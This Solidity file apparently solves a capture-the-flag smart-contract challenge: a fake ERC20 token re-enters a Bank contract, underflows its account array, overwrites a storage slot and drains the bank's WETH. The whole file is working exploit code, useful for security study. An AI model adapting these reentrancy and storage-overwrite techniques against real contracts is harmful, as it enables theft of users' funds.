pragma solidity 0.4.24;

import "./SetupBank.sol";
import "./Bank.sol";

contract ExploitToken is ERC20Like {
    Bank public bank;
    iWETH9 public weth;
    SetupBank public setup;
    
    uint256 public reentering = 0;
    uint256 public accountId;

    constructor(address _setup) public {
       setup = SetupBank(_setup);

        bank = setup.bank();
        weth = setup.weth();
    }
    
    function transfer(address, uint) public returns (bool) {
        return true;
    }
    
    function transferFrom(address, address, uint) public returns (bool) {
        return true;
    }
    
    function approve(address, uint) public returns (bool) {
        return true;
    }
    
    function balanceOf(address) public view returns (uint) {
        
        if (reentering == 1) {
            
            bank.closeLastAccount(); // closeLastAccount{ step 2a } length: 0 uniqueTokens: 0
            reentering = 2;
            bank.depositToken(0, address(this), 0); // depositToken{ step 2b }  length: 1 uniqueTokens: 1


        } else if (reentering == 2) {
            reentering = 3;
            bank.closeLastAccount(); // closeLastAccount{ step 2c } : length: 0 uniqueTokens: 1
        }
        
        return 0;
    }
    

    
    function exploit() public {
        // accounts[msg.sender].length-- in withdrawToken function is controlled only if the amount is zero

        bank.depositToken(0, address(this), 0); // length: 1 uniqueTokens: 1
        bank.depositToken(1, address(this), 0); // length: 2 uniqueTokens: 2

        bank.withdrawToken(0, address(this), 0); // length: 2 uniqueTokens: 1
        bank.withdrawToken(1, address(this), 0); // length: 1 uniqueTokens: 0

        reentering = 1;

        bank.withdrawToken(0, address(this), 0); //        L63{ step1 } : length:  1 uniqueTokens: 0
                                                 //  balanceOf{ step2 } : length:  1 uniqueTokens: 0 
                                                 //        closeLastAccount{ step 2a } : length: 0 uniqueTokens: 0
                                                 //            depositToken{ step 2b } : length: 1 uniqueTokens: 1
                                                 //        closeLastAccount{ step 2c } : length: 0 uniqueTokens: 1
                                                 //        L71{ step4 } : length:  0 uniqueTokens: 0
                                                 //        L77{ step5 } : length: -1 uniqueTokens: 0

    }

    function stealWeth() external {

        address WETH_ADDRESS = address(weth);

        // compute the storage slot for accounts[our_addr]
        // for the mapping we need to hash the key value with slot, that's why keccak256(keccak256(address(this).2))
        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));
        bytes32 myArrayStart = keccak256(myArraySlot);
        
        accountId = 0;
        uint256 slotsNeeded;
        while (true) {

            // compute the storage slot for the balances mapping
            // keccak256(start_slot)) + (index * elementSize); where index -> accountId, elementSize of Account struct -> 3
            bytes32 account0Start = bytes32(uint(myArrayStart) + 3 * accountId);

            // this means that account0Start is the address of the slot for the `accountName`
            // account0Start + 2, where 2 is the position within the struct, it starts from 0, so balances starts at postion 2
            bytes32 account0Balances = bytes32(uint(account0Start) + 2);
            // for mapping weth address (key) + account0Balances -> the slot position 
            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);
            
            // account0Start := keccak(keccak(our_addr . 2)) + 3 * accountId
            // wethBalance := keccak( WETH . [accountStructSlot + 2] )

            // Knowing our balance slot, we can solve for the accountId to figure out what arguments to call setAccountName with:
            // account = [wethBalance - keccak(keccak(our_addr . 2))] / 3

            slotsNeeded = uint256(wethBalance) - uint256(myArrayStart);

            // We check here for zero because the both sides of the formula needs to be equal 
            if (uint256(slotsNeeded) % 3 == 0) {
                break;
            }
            accountId++;
        }
        
        uint256 account = uint256(slotsNeeded) / 3;
        
        // the `string(abi.encodePacked(bytes31(uint248(uint(-1)))))`: we set the maximum amount into the slot to have ability to withdraw any amount of money
        // the `account`: what we tried to do above it's to calculate at what accountName we can 
        bank.setAccountName(account, string(abi.encodePacked(bytes31(uint248(uint(-1))))));
        
        bank.withdrawToken(accountId, address(weth), weth.balanceOf(address(bank)));
    }

}

contract ExploitBank {
    ExploitToken public token;
    constructor(address _setup) payable {
       token =  new ExploitToken(_setup);
       token.exploit();
       token.stealWeth();
    }
}